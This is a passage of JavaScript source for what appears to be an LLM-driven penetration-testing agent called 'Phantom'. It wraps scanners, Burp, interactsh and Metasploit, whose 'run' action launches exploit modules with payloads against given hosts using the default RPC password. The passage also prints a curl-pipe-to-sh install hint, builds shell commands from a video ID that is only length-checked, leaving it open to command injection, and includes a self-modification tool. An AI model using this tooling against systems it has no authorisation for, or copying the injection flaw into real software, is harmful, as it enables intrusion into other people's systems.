      const hosts = raw.filter(l => l.startsWith("Host:"));
      return formatExternal("Masscan", target, hosts, 100);
    } catch(e) { return `[masscan Error] ${e.message}`; }
  },

  nikto: async (input) => {
    if (!input || !input.trim()) return `[nikto] Usage: @nikto|<URL> [options]\n  Web server scanner\n  Examples:\n    @nikto|-h https://example.com`;
    try {
      const p = input.trim().split(/\s+/);
      const lines = runExternal("nikto", p, {timeout:300000,maxBuffer:2*1024*1024});
      const findings = lines.filter(l => l.includes("+") && !l.includes("-------") && !l.includes("Target IP"));
      return findings.length ? [`🔎 Nikto: ${p[1]||""}`, `Findings: ${findings.length}`,...findings.slice(0,80).map(l=>`  ${l}`)].join("\n") : `[nikto] 0 findings`;
    } catch(e) { return `[nikto Error] ${e.message}`; }
  },

  arjun: async (input) => {
    if (!input || !input.trim()) return `[arjun] Usage: @arjun|<URL> [options]\n  Finds hidden GET/POST parameters\n  Examples:\n    @arjun|-u https://example.com/api`;
    try {
      const p = input.trim().split(/\s+/);
      const lines = runExternal("arjun", p, {timeout:180000});
      const found = lines.filter(l => l.includes("[+]")||l.includes("found")||l.includes("parameter"));
      return found.length ? [`🔎 Arjun: ${p[1]||""}`,...found.slice(0,40).map(l=>`  ${l}`)].join("\n") : `[arjun] No params found`;
    } catch(e) { return `[arjun Error] ${e.message}`; }
  },

  gospider: async (input) => {
    if (!input || !input.trim()) return `[gospider] Usage: @gospider|<URL> [options]\n  Spider: discovers links, forms, scripts, S3\n  Examples:\n    @gospider|-s https://example.com`;
    try {
      const p = input.trim().split(/\s+/);
      const lines = runExternal("gospider", p, {timeout:180000,maxBuffer:2*1024*1024});
      const urls = lines.filter(l => l.startsWith("http"));
      return urls.length ? [`🕷️ Gospider: ${p[1]||""}`, `URLs: ${urls.length}`,...urls.slice(0,60).map(u=>`  ${u}`)].join("\n") : `[gospider] 0 results`;
    } catch(e) { return `[gospider Error] ${e.message}`; }
  },

  cloud_enum: async (input) => {
    if (!input || !input.trim()) return `[cloud_enum] Usage: @cloud_enum|<keyword> [options]\n  Enumerates: S3, Azure Blobs, GCP buckets\n  Examples:\n    @cloud_enum|targetname`;
    try {
      const p = input.trim().split(/\s+/);
      const kw = p[0], extra = p.slice(1);
      const lines = runExternal("cloud_enum", ["-k",kw,...extra,"-q"], {timeout:180000,maxBuffer:2*1024*1024});
      const found = lines.filter(l => l.includes("found")||l.includes("open")||l.includes("public")||l.includes("http"));
      return formatExternal("CloudEnum", kw, found, 60);
    } catch(e) { return `[cloud_enum Error] ${e.message}`; }
  },

  notify: async (input) => {
    if (!input || !input.trim()) return `[notify] Usage: @notify|<message>\n  Sends notifications to Slack/Telegram/Discord\n  Requires ~/.config/notify/provider-config.yaml`;
    try {
      const lines = runExternal("notify", ["-silent","-data",input], {timeout:30000});
      return `✅ Notification sent: ${input.slice(0,60)}${input.length>60?"...":""}`;
    } catch(e) { return `[notify Error] ${e.message}`; }
  },

  interactsh: async (input) => {
    if (!input || !input.trim()) return `[interactsh] Usage: @interactsh|<action> [options]\n  Actions: start, poll <url>, stop\n  Examples:\n    @interactsh|start                              Get callback URL\n    @interactsh|poll https://oastify.com/1234      Check interactions`;
    try {
      const p = input.trim().split(/\s+/);
      const action = p[0], extra = p.slice(1);
      if (action==="start") {
        const lines = runExternal("interactsh-client", ["-json",...extra], {timeout:15000});
        return `📡 Interactsh: ${lines[0]||""}\nUse URL in SSRF/blind XSS payloads`;
      } else if (action==="poll"&&p[1]) {
        const lines = runExternal("interactsh-client", ["-poll-url",p[1],...extra,"-json"], {timeout:30000});
        return lines.length ? [`📡 Interactions (${lines.length}):`,...lines.slice(0,30).map(l=>`  ${l}`)].join("\n") : `[interactsh] No interactions`;
      } else if (action==="stop") return `[interactsh] Stopped`;
      return `[interactsh] start | poll <url> | stop`;
    } catch(e) { return `[interactsh Error] ${e.message}`; }
  },

  config: async (input) => {
    try {
      const { resolve:presolve } = await import("path");
      const cfgPath = presolve(BASE_DIR, "config.json");
      let cfg = {};
      try { cfg = JSON.parse(fs.readFileSync(cfgPath,"utf-8")); } catch {}
      const cmd = (input||"").trim().toLowerCase();
      if (!cmd || cmd==="list"||cmd==="ls") {
        const keys = Object.keys(cfg).sort();
        if (!keys.length) return "[config] No settings saved";
        return `⚙ Config (${cfgPath})\n${keys.map(k => `  ${k}: ${typeof cfg[k]==="string"&&cfg[k].length>32 ? cfg[k].slice(0,32)+"..." : JSON.stringify(cfg[k])}`).join("\n")}`;
      }
      if (cmd==="path") return `📁 ${cfgPath}`;
      if (cmd.startsWith("get ")) {
        const k = cmd.slice(4).trim();
        if (k in cfg) return `${k}: ${JSON.stringify(cfg[k],null,2)}`;
        return `[config] Key "${k}" not found`;
      }
      if (cmd.startsWith("set ")) {
        const rest = cmd.slice(4).trim();
        const sp = rest.indexOf(" ");
        const k = sp > 0 ? rest.slice(0,sp) : rest;
        const v = sp > 0 ? rest.slice(sp+1) : "";
        if (!k||!v) return "[config] Usage: @config|set key value";
        cfg[k] = v;
        fs.writeFileSync(cfgPath, JSON.stringify(cfg,null,2));
        // Apply config change at runtime
        const upper = k.toUpperCase();
        if (upper.endsWith("_API_KEY")||["VT_API_KEY","SHODAN_API_KEY","GITHUB_TOKEN"].includes(upper)) process.env[upper] = v;
        if (k==="default_provider") { __r.PHANTOM_LLM_PROVIDER=v; process.env.PHANTOM_LLM_PROVIDER=v; if(__r.llmInstance) try{__r.llmInstance.provider=v}catch{} __r.setProvider(v); }
        if (k==="default_model") { if(__r._config) __r._config.default_model=v; }
        return `✅ ${k}: ${v.slice(0,64)}`;
      }
      if (cmd.startsWith("rm ")||cmd.startsWith("del ")||cmd.startsWith("remove ")) {
        const k = cmd.split(/\s+/).slice(1).join(" ").trim();
        if (!k||!(k in cfg)) return `[config] Key "${k}" not found`;
        delete cfg[k];
        fs.writeFileSync(cfgPath, JSON.stringify(cfg,null,2));
        return `✅ Removed "${k}"`;
      }
      return `[config] Usage: @config|list | set <key> <value> | get <key> | rm <key> | path`;
    } catch(e) { return `[config Error] ${e.message}`; }
  },

  web_search: async (query) => {
    if (!query || !query.trim()) return `[web_search] Usage: @web_search|<query>\\n  Searches via DuckDuckGo + Wikipedia (no API key)\\n  Examples:\\n    @web_search|what is CSRF\\n    @web_search|latest CVEs 2025`;
    try {
      const q = query.trim();
      const lines = [];
      let source = "mixed";

      // 1. DuckDuckGo Instant Answer API
      const ddg = await fetch(`https://api.duckduckgo.com/?q=${encodeURIComponent(q)}&format=json&no_html=1&skip_disambig=1`, {
        headers: { "User-Agent": "Phantom-Cyber/1.0" }
      }).then(r => r.ok ? r.json() : null).catch(() => null);

      if (ddg) {
        if (ddg.AbstractText) lines.push(`📖 ${ddg.AbstractText}`);
        if (ddg.Answer) lines.push(`💡 ${ddg.Answer}`);
        if (ddg.AbstractSource) lines.push(`  Source: ${ddg.AbstractSource}`);
        if (ddg.Infobox?.content) ddg.Infobox.content.forEach(c => {
          if (c.value && typeof c.value !== "object") lines.push(`  ${c.label || "?"}: ${c.value}`);
        });
        if (ddg.Results?.length) ddg.Results.slice(0, 3).forEach(res => lines.push(`🔗 ${res.Text || res.FirstURL}`));
        if (ddg.RelatedTopics?.length) {
          ddg.RelatedTopics.flatMap(t => t.Topics || [t]).slice(0, 6).forEach(t => {
            if (t.Text) lines.push(`  • ${t.Text}`);
          });
        }
        source = "duckduckgo";
      }

      // 2. Wikipedia search (if DDG gave little)
      if (lines.length < 3) {
        const sanitize = s => s.replace(/<[^>]+>/g, "").replace(/&amp;/g, "&").replace(/&quot;/g, '"').replace(/&#?\w+;/g, " ").replace(/\s+/g, " ").trim();
        const wiki = await fetch(
          `https://en.wikipedia.org/w/api.php?action=query&list=search&srsearch=${encodeURIComponent(q)}&format=json&srlimit=5&srprop=snippet`
        ).then(r => r.json()).catch(() => null);
        const wikiResults = wiki?.query?.search || [];
        if (wikiResults.length) {
          lines.push(`📚 Wikipedia (${wikiResults.length} results):`);
          wikiResults.slice(0, 5).forEach(r => lines.push(`  • ${r.title} — ${sanitize(r.snippet).slice(0, 140)}`));
          source = source === "duckduckgo" ? "mixed" : "wikipedia";
        }
      }

      // 3. CVE tip
      if (/cve|cwe|vulnerability|exploit/i.test(q))
        lines.push(`\n🔧 Tip: @cve_search|${q.replace(/^what (is|are|about)\s+/i, "").trim()}`);

      return lines.length ? `🔍 ${source}: "${q}"\n${lines.join("\n")}` : `[web_search] No results for "${q}"`;
    } catch (e) { return `[web_search Error] ${e.message}`; }
  },

  burp: async (input) => {
    if (!input || !input.trim()) return `[burp] Usage: @burp|<action> [args]\\n  Actions:\\n    check                    Test connection to Burp REST API\\n    scan|URL                 Start a scan on target URL\\n    issues [url]             List scan issues (optionally filter by URL)\\n    spider|URL               Spider a target\\n    config                   Show Burp configuration\\n  Requires Burp Suite Professional REST API on localhost:1337\\n  Examples:\\n    @burp|check\\n    @burp|scan|https://example.com\\n    @burp|issues`;
    const BURP_BASE = "http://127.0.0.1:1337";
    try {
      const parts = input.trim().split("|").map(s => s.trim());
      const action = parts[0].toLowerCase();
      const args = parts.slice(1);

      // Connection test
      if (action === "check") {
        const r = await fetch(`${BURP_BASE}/health`, { signal: AbortSignal.timeout(5000) });
        if (!r.ok) return `[burp] Burp REST API at ${BURP_BASE} returned status ${r.status}`;
        const data = await r.text();
        const ver = await fetch(`${BURP_BASE}/api/v0.1/version`, { signal: AbortSignal.timeout(3000) }).then(r2=>r2.text()).catch(()=>"unknown");
        return `✅ Burp Suite connected (${BURP_BASE})\\n  Health: ${data.slice(0,100)}\\n  Version: ${ver.slice(0,80)}`;
      }

      // Scan
      if (action === "scan" && args[0]) {
        const r = await fetch(`${BURP_BASE}/api/v0.1/scanner/scans`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ url_list: [args[0]] }),
          signal: AbortSignal.timeout(10000)
        });
        const data = await r.json();
        return `🔎 Burp Scan started\\n  Target: ${args[0]}\\n  Scan ID: ${data.scan_id || data.id || "unknown"}\\n  Status: ${data.status || "queued"}`;
      }

      // Issues
      if (action === "issues") {
        const url = args[0] ? `?url=${encodeURIComponent(args[0])}` : "";
        const r = await fetch(`${BURP_BASE}/api/v0.1/scanner/issues${url}`, { signal: AbortSignal.timeout(10000) });
        const data = await r.json();
        const issues = data.issues || data.vulnerabilities || [];
        if (!issues.length) return `[burp] No issues found${args[0] ? ` for ${args[0]}` : ""}`;
        return `🔴 Burp Issues (${issues.length}):\\n${issues.slice(0, 20).map((i, idx) =>
          `  ${idx + 1}. [${i.severity || "?"}] ${i.name || i.type} — ${i.path || i.url || ""}`
        ).join("\\n")}`;
      }

      // Spider
      if (action === "spider" && args[0]) {
        const r = await fetch(`${BURP_BASE}/api/v0.1/spider/tasks`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ url: args[0] }),
          signal: AbortSignal.timeout(10000)
        });
        const data = await r.json();
        return `🕷️ Burp Spider started\\n  Target: ${args[0]}\\n  Task ID: ${data.task_id || data.id || "unknown"}`;
      }

      // Config
      if (action === "config") {
        const r = await fetch(`${BURP_BASE}/api/v0.1/configuration`, { signal: AbortSignal.timeout(5000) }).catch(() => null);
        if (!r) return `[burp] Config endpoint not available (Burp Pro required)`;
        const data = await r.json();
        return `⚙ Burp Config:\\n${JSON.stringify(data, null, 2).slice(0, 1500)}`;
      }

      return `[burp] Unknown action: ${action}. Try: check, scan <url>, issues [url], spider <url>, config`;
    } catch (e) {
      const msg = e.message;
      if (msg.includes("ECONNREFUSED") || msg.includes("fetch failed"))
        return `[burp] Burp Suite not running at ${BURP_BASE}\\n  Start Burp Pro with REST API enabled on port 1337\\n  Or install: not available via package manager (download from portswigger.net)`;
      return `[burp Error] ${e.message}`;
    }
  },

  msf: async (input) => {
    if (!input || !input.trim()) return `[msf] Usage: @msf|<action> [args]\\n  Actions:\\n    check                    Test msfrpc connection\\n    search|query             Search modules (exploit, auxiliary, post)\\n    console|cmd              Run a console command (via RPC)\\n    sessions                 List active sessions\\n    run|module|payload|target Execute a module\\n  Requires Metasploit + msfrpcd running on localhost:55553\\n  Examples:\\n    @msf|check\\n    @msf|search|eternalblue\\n    @msf|sessions`;
    const MSF_HOST = "http://127.0.0.1:55553";
    let token = null;

    async function msfRpc(method, params = []) {
      const body = { jsonrpc: "2.0", method, params: token ? [token, ...params] : params, id: 1 };
      const r = await fetch(`${MSF_HOST}/api/`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
        signal: AbortSignal.timeout(15000)
      });
      const d = await r.json();
      if (d.error) throw new Error(d.error.message || d.error.string || JSON.stringify(d.error));
      return d.result;
    }

    try {
      const parts = input.trim().split("|").map(s => s.trim());
      const action = parts[0].toLowerCase();
      const args = parts.slice(1);

      // Try to auth (default password "msf" — common setup)
      try {
        token = await msfRpc("auth.login", ["msf"]);
        if (typeof token === "object" && token.token) token = token.token;
      } catch {}

      if (action === "check") {
        const alive = token ? `✅ Authenticated (token: ${String(token).slice(0, 8)}...)` : "⚠ Could not auth (default password may differ)";
        return `🔧 Metasploit RPC: ${MSF_HOST}\\n  ${alive}`;
      }

      if (!token) return `[msf] Could not connect/auth to msfrpc at ${MSF_HOST}\\n  Start: msfrpcd -P msf -S\\n  Or check password with: @msf|check`;

      if (action === "search") {
        const query = args[0] || "";
        if (!query) return `[msf] Usage: @msf|search|<query>`;
        const result = await msfRpc("module.search", [query]);
        const mods = Array.isArray(result) ? result : result?.modules || [];
        if (!mods.length) return `[msf] No modules for "${query}"`;
        return `🔎 Metasploit: "${query}" (${mods.length} matches)\\n${mods.slice(0, 15).map((m, i) =>
          `  ${i + 1}. ${m.type || "?"}/${m.refname || m.name || "?"} — ${(m.description || m.desc || "").slice(0, 60)}`
        ).join("\\n")}`;
      }

      if (action === "console") {
        const cmd = args.join(" ");
        if (!cmd) return `[msf] Usage: @msf|console|<command>`;
        const console_id = await msfRpc("console.create");
        const cid = typeof console_id === "object" ? console_id.id : console_id;
        await msfRpc("console.write", [cid, cmd + "\\n"]);
        await new Promise(r => setTimeout(r, 2000));
        const out = await msfRpc("console.read", [cid]);
        await msfRpc("console.destroy", [cid]);
        const text = typeof out === "string" ? out : out?.data || out?.output || JSON.stringify(out);
        return `💻 msf > ${cmd}\\n${text.slice(0, 3000)}`;
      }

      if (action === "sessions") {
        const result = await msfRpc("session.list", []);
        const sessions = typeof result === "object" ? Object.entries(result) : [];
        if (!sessions.length) return `[msf] No active sessions`;
        return `🔌 Metasploit Sessions (${sessions.length}):\\n${sessions.slice(0, 20).map(([id, s]) =>
          `  [${id}] ${s.type || "?"} — ${s.target_host || s.host || "?"}:${s.target_port || s.port || "?"} (${s.platform || "?"})`
        ).join("\\n")}`;
      }

      if (action === "run" && args[0]) {
        const module = args[0];
        const payload = args[1] || "";
        const target = args[2] || "";
        const console_id = await msfRpc("console.create");
        const cid = typeof console_id === "object" ? console_id.id : console_id;
        await msfRpc("console.write", [cid, `use ${module}\\n`]);
        if (target) await msfRpc("console.write", [cid, `set RHOSTS ${target}\\n`]);
        if (payload) await msfRpc("console.write", [cid, `set PAYLOAD ${payload}\\n`]);
        await msfRpc("console.write", [cid, `run -j\\n`]);
        await new Promise(r => setTimeout(r, 3000));
        const out = await msfRpc("console.read", [cid]);
        await msfRpc("console.destroy", [cid]);
        const text = typeof out === "string" ? out : out?.data || out?.output || JSON.stringify(out);
        return `🚀 msf > use ${module}; run\\n${text.slice(0, 3000)}`;
      }

      return `[msf] Unknown action: ${action}. Try: check, search <query>, console <cmd>, sessions, run <module> [payload] [target]`;
    } catch (e) {
      const msg = e.message;
      if (msg.includes("ECONNREFUSED") || msg.includes("fetch failed"))
        return `[msf] Metasploit msfrpcd not running at ${MSF_HOST}\\n  Install: pkg install metasploit 2>/dev/null; or: curl https://raw.githubusercontent.com/.../msfinstall | sh\\n  Start: msfrpcd -P msf -S -f`;
      return `[msf Error] ${e.message}`;
    }
  },

  youtube_transcript: async (input) => {
    if (!input || !input.trim()) return `[youtube_transcript] Usage: @youtube_transcript|<video_url_or_id> [options]\\n  Options: --text-only, --timestamps, --lang <code>\\n  Fetches video transcript via youtube-transcript-api\\n  Examples:\\n    @youtube_transcript|Kx4y9c7w2JQ\\n    @youtube_transcript|https://youtube.com/watch?v=VIDEO_ID\\n    @youtube_transcript|VIDEO_ID --text-only`;
    try {
      // ── Parse args ──
      let videoId, textOnly = false, timestamps = false, langParts = [];
      const tokens = input.trim().split(/\s+/);
      const cleanTokens = [];
      for (let i = 0; i < tokens.length; i++) {
        const t = tokens[i];
        if (t === "--text-only") textOnly = true;
        else if (t === "--timestamps") timestamps = true;
        else if (t === "--lang" && i + 1 < tokens.length) { langParts.push(tokens[++i]); }
        else cleanTokens.push(t);
      }
      videoId = cleanTokens.join(" ").trim();

      // Extract video ID from URL
      const urlMatch = videoId.match(/(?:v=|youtu\.be\/|\/shorts\/|embed\/)([a-zA-Z0-9_-]{11})/);
      if (urlMatch) videoId = urlMatch[1];
      if (!videoId || videoId.length !== 11) return `[youtube_transcript] Invalid video ID: "${videoId}"`;

      const { execSync } = await import("child_process");
      const { writeFileSync, unlinkSync } = await import("fs");
      const { resolve } = await import("path");

      // ── Find Python ──
      const python = (() => {
        try { execSync("test -f /tmp/yt_venv/bin/python3", { timeout: 2000 }); return "/tmp/yt_venv/bin/python3"; }
        catch { try { execSync("python3 -c \"from youtube_transcript_api import YouTubeTranscriptApi; print('ok')\"", { timeout: 5000 }); return "python3"; }
        catch { return null; }}
      })();
      if (!python) return `[youtube_transcript] youtube-transcript-api not installed. Run: pip3 install youtube-transcript-api`;

      // ── Get video title via yt-dlp (best-effort) ──
      let title = videoId;
      try { title = execSync(`yt-dlp --print title "https://youtube.com/watch?v=${videoId}" 2>/dev/null || echo "${videoId}"`, { encoding: "utf-8", timeout: 10000 }).trim(); } catch {}

      // ── Build & run Python script ──
      const langs = JSON.stringify(langParts.length ? langParts : ["en"]);
      const tsFlag = timestamps ? "True" : "False";
      const pyScript = `# phantom youtube_transcript
from youtube_transcript_api import YouTubeTranscriptApi
api = YouTubeTranscriptApi()
segs = list(api.fetch("${videoId}", languages=${langs}))
for s in segs:
    print(f"[{s.start:.1f}s] {s.text}" if ${tsFlag} else s.text)
print("__SEGS__" + str(len(segs)))
`;
      const tmpFile = resolve("/tmp", `yt_${videoId}_${Date.now()}.py`);
      writeFileSync(tmpFile, pyScript, "utf-8");
      let out;
      try { out = execSync(`${python} ${tmpFile}`, { encoding: "utf-8", timeout: 30000, maxBuffer: 1024 * 1024 }); }
      finally { try { unlinkSync(tmpFile); } catch {} }

      const allLines = out.trim().split("\n");
      const segLine = allLines.find(l => l.startsWith("__SEGS__"));
      const segCount = segLine ? parseInt(segLine.replace("__SEGS__", "")) : 0;
      const endMarker = segLine ? allLines.indexOf(segLine) : allLines.length;
      const transcript = allLines.slice(0, endMarker).join("\n").trim();

      if (!transcript) return `[youtube_transcript] No transcript for "${title}"`;

      if (textOnly) return `--- ${title} ---\n${transcript.slice(0, 8000)}`;
      const truncated = transcript.length > 5000;
      return `🎬 ${title}\n  Segments: ${segCount || "?"}  ·  ${transcript.length} chars\n${truncated ? "─".repeat(40) + "\n" : ""}${transcript.slice(0, 5000)}${truncated ? "\n...[truncated, " + (transcript.length - 5000) + " more]" : ""}`;
    } catch (e) {
      if (e.message?.includes("TranscriptsDisabled")) return `[youtube_transcript] Transcript disabled for this video`;
      return `[youtube_transcript Error] ${e.message}`;
    }
  },

  // ── LEARNING / KNOWLEDGE ──
  learn: async (input) => {
    if (!input || !input.trim()) return `[learn] Usage: @learn|<action> [args]\n  Actions:\n    <topic>|<fact>       Save a fact under topic\n    search|<query>       Search stored knowledge\n    list                 List all knowledge topics\n    forget|<topic>       Remove entries by topic\n  Examples:\n    @learn|pentest|Always check robots.txt for hidden paths\n    @learn|search|SQL injection`;
    try {
      const parts = input.trim().split("|").map(s => s.trim());
      const action = parts[0].toLowerCase();
      const args = parts.slice(1);

      if (action === "list") {
        if (!fs.existsSync(KNOWLEDGE_DIR)) return "[learn] No knowledge stored yet";
        const files = fs.readdirSync(KNOWLEDGE_DIR).filter(f => f.endsWith(".json"));
        if (!files.length) return "[learn] No knowledge stored yet";
        const topics = {};
        files.forEach(f => {
          try {
            const d = JSON.parse(fs.readFileSync(resolve(KNOWLEDGE_DIR, f), "utf-8"));
            (d.tags || ["general"]).forEach(t => { topics[t] = (topics[t] || 0) + 1; });
          } catch {}
        });
        const sorted = Object.entries(topics).sort((a, b) => b[1] - a[1]);
        return `🧠 Knowledge (${files.length} facts, ${sorted.length} topics)\n${sorted.map(([t, c]) => `  ${t}: ${c}`).join("\n")}\n\n@learn|search|<topic> to browse`;
      }

      if (action === "search" && args[0]) {
        const q = args.join(" ").toLowerCase();
        if (!fs.existsSync(KNOWLEDGE_DIR)) return "[learn] No knowledge stored yet";
        const results = fs.readdirSync(KNOWLEDGE_DIR).filter(f => f.endsWith(".json")).map(f => {
          try {
            const d = JSON.parse(fs.readFileSync(resolve(KNOWLEDGE_DIR, f), "utf-8"));
            const match = d.tags.some(t => t.toLowerCase().includes(q)) || d.content.toLowerCase().includes(q);
            return match ? { tags: d.tags, content: d.content, created: d.created } : null;
          } catch { return null; }
        }).filter(Boolean);
        if (!results.length) return `[learn] No results for "${q}"`;
        return `🧠 Knowledge: "${q}" (${results.length})\n${results.slice(0, 10).map((r, i) =>
          `${i + 1}. [${(r.tags || []).join(", ")}] ${r.content.slice(0, 200)}`
        ).join("\n")}`;
      }

      if (action === "forget" && args[0]) {
        const topic = args[0].toLowerCase();
        if (!fs.existsSync(KNOWLEDGE_DIR)) return "[learn] No knowledge to forget";
        let removed = 0;
        fs.readdirSync(KNOWLEDGE_DIR).filter(f => f.endsWith(".json")).forEach(f => {
          try {
            const d = JSON.parse(fs.readFileSync(resolve(KNOWLEDGE_DIR, f), "utf-8"));
            if (d.tags?.some(t => t.toLowerCase().includes(topic))) {
              fs.unlinkSync(resolve(KNOWLEDGE_DIR, f));
              removed++;
            }
          } catch {}
        });
        return removed ? `🗑️ Removed ${removed} facts about "${topic}"` : `[learn] No facts found for "${topic}"`;
      }

      // Default: save knowledge (topic|fact)
      const topic = action; // First part is the topic
      const content = args.join("|") || parts.slice(1).join("|");
      if (!content) return `[learn] Usage: @learn|<topic>|<fact>`;
      if (!fs.existsSync(KNOWLEDGE_DIR)) fs.mkdirSync(KNOWLEDGE_DIR, { recursive: true });
      const slug = topic.replace(/[^a-z0-9_-]/gi, "_").slice(0, 30) + "_" + Date.now();
      fs.writeFileSync(resolve(KNOWLEDGE_DIR, `${slug}.json`), JSON.stringify({
        tags: [topic, ...(topic.includes(",") ? topic.split(",").map(t => t.trim()) : [])],
        content,
        created: new Date().toISOString()
      }, null, 2), "utf-8");
      return `🧠 Learned: "${topic}" ✓`;
    } catch (e) { return `[learn Error] ${e.message}`; }
  },

  // ── SELF-INTROSPECTION ──
  self: async (input) => {
    const action = (input || "").trim().toLowerCase();
    try {
      // @self — full status report
      if (!action || action === "status") {
        const pkg = JSON.parse(fs.readFileSync(resolve(process.cwd(), "package.json"), "utf-8"));
        const toolCount = Object.keys(hackerTools).length;
        const configPath = resolve(BASE_DIR, "config.json");
        let config = {};
        try { config = JSON.parse(fs.readFileSync(configPath, "utf-8")); } catch {}
        const memoryCount = fs.existsSync(MEMORY_DIR) ? fs.readdirSync(MEMORY_DIR).filter(f => f.endsWith(".json")).length : 0;
        const knowledgeCount = fs.existsSync(KNOWLEDGE_DIR) ? fs.readdirSync(KNOWLEDGE_DIR).filter(f => f.endsWith(".json")).length : 0;
        return `╔══ PHANTOM ══ ${pkg.version || "0.2.0"} ══╗
  Tools:    ${toolCount}
  Provider: ${__r.PHANTOM_LLM_PROVIDER || config.default_provider || "?"}
  Model:    ${config.default_model || "?"}
  Memory:   ${memoryCount} files
  Learned:  ${knowledgeCount} facts
  Config:   ${configPath}
  CWD:      ${process.cwd()}
╚${"═".repeat(36)}╝`;
      }

      // @self|health — check external dependencies
      if (action === "health") {
        const { execSync } = await import("child_process");
        const checks = {
          "node": process.version,
          "npm": "checking...",
          "nmap": false, "subfinder": false, "httpx": false, "nuclei": false,
          "dnsx": false, "gau": false, "hydra": false, "john": false,
          "whatweb": false, "wafw00f": false, "masscan": false, "nikto": false,
          "ffuf": false, "gospider": false, "arjun": false, "trufflehog": false,
          "searchsploit": false, "yt-dlp": false,
        };
        const results = ["📡 Health Check"];
        Object.entries(checks).forEach(([tool, status]) => {
          if (status) { results.push(`  ✅ ${tool} ${status}`); return; }
          try {
            const r = execSync(`which ${tool} 2>/dev/null || command -v ${tool} 2>/dev/null`, { encoding: "utf-8", timeout: 3000 });
            if (r.trim()) {
              const ver = execSync(`${tool} --version 2>/dev/null || ${tool} -v 2>/dev/null || echo ""`, { encoding: "utf-8", timeout: 3000 }).trim().split("\n")[0].slice(0, 40);
              results.push(`  ✅ ${tool} ${ver ? "(" + ver + ")" : ""}`);
            } else results.push(`  ❌ ${tool} — not installed`);
          } catch { results.push(`  ❌ ${tool} — not installed`); }
        });
        // Check python youtube-transcript-api
        try {
          execSync("/tmp/yt_venv/bin/python3 -c 'from youtube_transcript_api import YouTubeTranscriptApi; print(\"ok\")' 2>/dev/null", { timeout: 3000 });
          results.push("  ✅ youtube-transcript-api (python)");
        } catch { results.push("  ❌ youtube-transcript-api (python) — not installed"); }
        results.push(`\n  npm test — run to verify all tools work`);
        return results.join("\n");
      }

      // @self|tools — list all tools with descriptions
      if (action === "tools") {
        const names = Object.keys(hackerTools).sort();
        // Get first line of each function as description
        const descs = names.map(name => {
          const fn = hackerTools[name].toString();
          const firstLine = fn.split("\n")[0];
          const desc = (firstLine.match(/\/\/\s*(.+)/) || [])[1] || name;
          return `  ${name.padEnd(22)} ${desc.slice(0, 55)}`;
        });
        return `🔧 ${names.length} Tools\n${descs.join("\n")}`;
      }

      // @self|config — show current config
      if (action === "config") {
        const cfgPath = resolve(BASE_DIR, "config.json");
        let cfg = {};
        try { cfg = JSON.parse(fs.readFileSync(cfgPath, "utf-8")); } catch {}
        const keys = Object.keys(cfg).sort();
        if (!keys.length) return `[config] No settings at ${cfgPath}`;
        return `⚙ Config (${cfgPath})\n${keys.map(k =>
          `  ${k}: ${typeof cfg[k] === "string" && (k.includes("KEY") || k.includes("TOKEN") || k.includes("SECRET"))
            ? cfg[k].slice(0, 8) + "..." : JSON.stringify(cfg[k])}`
        ).join("\n")}`;
      }

      return `[self] Unknown: "${action}". Try: status, health, tools, config`;
    } catch (e) { return `[self Error] ${e.message}`; }
  },

  // ── SELF-EVOLVE ──
  evolve: async (input) => {
    const action = (input || "").trim().toLowerCase();
    try {
      const phantomDir = process.cwd();
      const { execSync } = await import("child_process");

      // @evolve — show usage
      if (!action) return `[evolve] Usage: @evolve|<action>\n  Actions:\n    validate    Syntax-check all .mjs files\n    analyze     Show code structure & stats\n    test        Run npm test and report results\n    repair      Attempt auto-fix of syntax errors (use git first!)\n  This tool lets Phantom validate and improve its own code.`;

      // @evolve|validate — syntax check all .mjs files
      if (action === "validate") {
        const files = fs.readdirSync(phantomDir)
          .filter(f => f.endsWith(".mjs") || f.endsWith(".js"))
          .concat(fs.readdirSync(resolve(phantomDir, "lib")).filter(f => f.endsWith(".mjs")).map(f => `lib/${f}`))
          .concat(fs.readdirSync(resolve(phantomDir, "test")).filter(f => f.endsWith(".mjs")).map(f => `test/${f}`));
        const results = files.map(file => {
          try {
            execSync(`node --check "${resolve(phantomDir, file)}"`, { encoding: "utf-8", timeout: 10000 });
            return { file, ok: true };
          } catch (e) {
            const err = e.stderr?.split("\n").slice(0, 3).join("; ") || e.message;
            return { file, ok: false, err: err.slice(0, 120) };
          }
        });
        const passed = results.filter(r => r.ok).length;
        const failed = results.filter(r => !r.ok);
        const output = [`🔍 Syntax Check: ${passed}/${results.length} passed`];
        if (failed.length) {
          output.push(`\n❌ ${failed.length} failed:`);
          failed.slice(0, 10).forEach(f => output.push(`  ${f.file}: ${f.err}`));
          output.push(`\nFix with @evolve|repair or edit manually with @self_read + @self_edit`);
        } else output.push(`\n✅ All files pass syntax check`);
        return output.join("\n");
      }

      // @evolve|analyze — code stats
      if (action === "analyze") {
        const stats = {};
        const allFiles = [
          ...fs.readdirSync(phantomDir).filter(f => f.endsWith(".mjs")),
          ...fs.readdirSync(resolve(phantomDir, "lib")).map(f => `lib/${f}`),
          ...fs.readdirSync(resolve(phantomDir, "test")).map(f => `test/${f}`),
        ];
        allFiles.forEach(f => {
          try {
            const content = fs.readFileSync(resolve(phantomDir, f), "utf-8");
            stats[f] = {
              lines: content.split("\n").length,
              size: content.length,
              tools: (content.match(/async\s+\(\s*(input|query|path|url|cmd|args)\s*\)/g) || []).length,
              functions: (content.match(/async\s+\w+/g) || []).length,
            };
          } catch {}
        });
        const totalLines = Object.values(stats).reduce((s, f) => s + f.lines, 0);
        const totalSize = Object.values(stats).reduce((s, f) => s + f.size, 0);
        const totalFns = Object.values(stats).reduce((s, f) => s + f.functions, 0);
        const totalTools = Object.keys(hackerTools).length;
        const lines = [`📊 Phantom Code Analysis`];
        lines.push(`  ${Object.keys(stats).length} files · ${totalLines} lines · ${(totalSize / 1024).toFixed(0)}KB`);
        lines.push(`  ${totalTools} tools · ${totalFns} async functions`);
        lines.push(`\n📁 Files:`);
        Object.entries(stats).sort((a, b) => b[1].lines - a[1].lines).slice(0, 10).forEach(([f, s]) => {
          lines.push(`  ${f.padEnd(28)} ${String(s.lines).padStart(5)} lines  ${s.tools > 0 ? s.tools + " tools" : s.functions + " fns"}`);
        });
        return lines.join("\n");
      }

      // @evolve|test — run npm test
      if (action === "test") {
        try {
